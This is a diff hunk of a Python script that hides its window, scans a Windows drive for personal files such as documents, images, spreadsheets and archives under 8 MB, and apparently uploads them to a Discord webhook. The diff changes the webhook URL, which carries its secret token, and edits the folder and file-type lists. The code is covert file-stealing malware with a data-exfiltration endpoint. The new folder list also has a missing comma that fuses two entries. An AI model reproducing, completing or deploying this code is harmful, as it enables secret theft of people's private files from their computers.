@@ -22,12 +22,12 @@ for hwnd in windows:
         win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1182426585836560415/kX7Kgo6CXcFo60HYiz0jmDePgNIBqZmAveKwy4AU8qo6551HFtIzsHFrey54gyvVWA0S"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1182997917263470592/sfguC107mLNq3kPr_-OkG5s3EUjBgvtD7BBmPL_jx0KmgEYDyY47bH6uQI1Ti3N6FUyX"
 # Directories to ignore during file search
-BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
+BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\' 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\']
 MAX_FILE_SIZE_MB = 8
 def check_file(file_path):
-    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.js', '.mkv', '.docx', '.xls', '.xlsx', '.docx', '.wav', '.xlsm', '.zip', '.mpeg', '.csv']
+    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.docx', '.xls', '.xlsx', '.docx', '.wav', '.xlsm', '.zip', '.mpeg', '.csv']
     max_size_mb = 8
     if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
         print(f"Skipping file {file_path} - invalid file type")
